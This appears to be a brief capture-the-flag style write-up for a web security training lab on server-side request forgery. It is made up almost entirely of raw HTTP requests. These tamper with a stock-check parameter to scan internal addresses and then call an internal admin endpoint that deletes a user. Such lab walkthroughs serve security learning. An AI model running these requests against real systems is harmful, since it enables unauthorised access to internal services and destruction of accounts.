##### step 1
identify vulnerable request
```
POST /product/stock HTTP/2
Host: 0a95001604c60c8881f47a9700c90092.web-security-academy.net
Cookie: session=nJiyg74ZNwvvmpseOE7SSy4jg1OAwsuq
Content-Length: 96
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Chromium";v="129", "Not=A?Brand";v="8"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
Accept: */*
Origin: https://0a95001604c60c8881f47a9700c90092.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a95001604c60c8881f47a9700c90092.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

##### step 2
create the base request, smack it into intruder to identify ip
```
POST /product/stock HTTP/2
Host: 0a95001604c60c8881f47a9700c90092.web-security-academy.net
Cookie: session=nJiyg74ZNwvvmpseOE7SSy4jg1OAwsuq
Content-Length: 48
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Chromium";v="129", "Not=A?Brand";v="8"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
Accept: */*
Origin: https://0a95001604c60c8881f47a9700c90092.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a95001604c60c8881f47a9700c90092.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

stockApi=http%3a%2f%2f192.168.0.0%3a8080%2fadmin
```

##### step 3
sit kid
```
POST /product/stock HTTP/2
Host: 0a95001604c60c8881f47a9700c90092.web-security-academy.net
Cookie: session=nJiyg74ZNwvvmpseOE7SSy4jg1OAwsuq
Content-Length: 72
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Sec-Ch-Ua: "Chromium";v="129", "Not=A?Brand";v="8"
Content-Type: application/x-www-form-urlencoded
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
Accept: */*
Origin: https://0a95001604c60c8881f47a9700c90092.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a95001604c60c8881f47a9700c90092.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

stockApi=http%3a%2f%2f192.168.0.38%3a8080%2fadmin/delete?username=carlos
```
